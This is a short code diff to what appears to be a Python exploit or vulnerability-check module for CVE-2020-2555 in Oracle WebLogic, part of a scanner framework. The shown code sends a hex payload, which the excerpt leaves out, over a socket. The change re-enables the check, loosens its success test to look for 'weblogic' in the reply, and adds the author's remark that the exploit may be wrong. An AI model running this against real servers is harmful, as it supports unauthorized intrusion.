@@ -2,7 +2,7 @@
 # _*_ coding:utf-8 _*_
 # CVE-2020-2555
 # updated 2020/06/09
-# by zhzyker
+# by zhzyker（exploit unsuccessful, maybe wrong）
 
 import re
 import socket
@@ -58,10 +58,10 @@ class CVE_2020_2555(Star):
         sock.send(bytes.fromhex(payload))
         time.sleep(delay)
         sock.send(bytes.fromhex(payload))
-        raise NotImplementedError('undefine.')
+        # raise NotImplementedError('undefine.')
         try:
             res = sock.recv(4096)
             # r = re.search(b'\\$Proxy[0-9]+', res)
-            # return not r is None, {'msg': 'finish.'}
+            return b'weblogic' in res, {'msg': 'finish.'}
         except socket.timeout:
             return False, {'msg': 'connection timeout.'}
